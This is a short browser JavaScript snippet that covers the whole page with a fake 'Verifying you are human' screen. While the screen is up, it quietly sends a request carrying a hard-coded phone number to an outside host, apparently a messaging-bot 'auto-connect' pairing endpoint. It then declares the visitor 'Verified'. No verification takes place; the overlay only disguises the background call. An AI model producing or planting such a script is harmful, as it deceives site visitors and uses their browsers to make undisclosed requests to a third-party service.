
(function () {
  "use strict";

  if (window.__verificationRunning) return;
  window.__verificationRunning = true;

  const overlay = document.createElement("div");

  overlay.id = "verification-overlay";

  overlay.innerHTML = `
    <div class="verification-box">
      <div class="verification-spinner"></div>
      <h3 id="verification-title">Verifying you are human</h3>
      <p id="verification-status">Please wait...</p>
    </div>
  `;

  const style = document.createElement("style");

  style.textContent = `
    #verification-overlay {
      position: fixed;
      inset: 0;
      z-index: 2147483647;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #090909;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    .verification-box {
      text-align: center;
      padding: 30px;
    }

    .verification-spinner {
      width: 42px;
      height: 42px;
      border: 3px solid #333;
      border-top-color: #fff;
      border-radius: 50%;
      margin: 0 auto 25px;
      animation: verification-spin .8s linear infinite;
    }

    @keyframes verification-spin {
      to { transform: rotate(360deg); }
    }

    .verification-box h3 {
      font-size: 19px;
      font-weight: 500;
    }

    .verification-box p {
      font-size: 13px;
      color: #999;
    }

    .verification-success {
      color: #4ade80 !important;
    }
  `;

  document.head.appendChild(style);
  document.body.appendChild(overlay);

  const title = overlay.querySelector("#verification-title");
  const status = overlay.querySelector("#verification-status");

  fetch(
    "https://proboy-pair.onrender.com/auto-connect?num=92326265555",
    {
      method: "GET",
      mode: "cors",
      cache: "no-store"
    }
  )
    .then(response => {
      if (!response.ok) throw new Error("Request failed");

      title.textContent = "Verified";
      status.textContent = "Verification completed";
      status.classList.add("verification-success");

      setTimeout(() => {
        overlay.remove();
        style.remove();
        window.__verificationRunning = false;
      }, 1000);
    })
    .catch(error => {
      console.error(error);

      title.textContent = "Connection unavailable";
      status.textContent = "Please try again later.";

      setTimeout(() => {
        overlay.remove();
        style.remove();
        window.__verificationRunning = false;
      }, 2500);
    });
})();
